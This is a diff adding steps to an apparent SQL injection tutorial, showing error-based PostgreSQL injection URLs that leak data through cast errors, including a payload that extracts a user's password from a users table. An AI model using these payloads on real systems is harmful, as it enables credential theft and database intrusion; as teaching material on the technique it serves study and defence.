@@ -29,3 +29,12 @@ The list of techniques with its letters is as follows:
 
 
 1. return **ERROR: UNION types character varying and integer cannot be matched** mean id's type is character while 1 is type of integer
+
+`http://domain.com/index.php?id=1' and 1=cast((select 'abc') as int)--`
+
+1. ERROR: invalid input syntax for type integer: "abc". Notice that the string abc is show in the error
+2. Try to select the password
+
+`http://domain.com/index.php?id=1' and 1=cast((select password from users limit 1) as int)--`
+
+1. ERROR: invalid input syntax for type integer: "gvq5xw5rszwpbbst7ksl". The value of password is shown
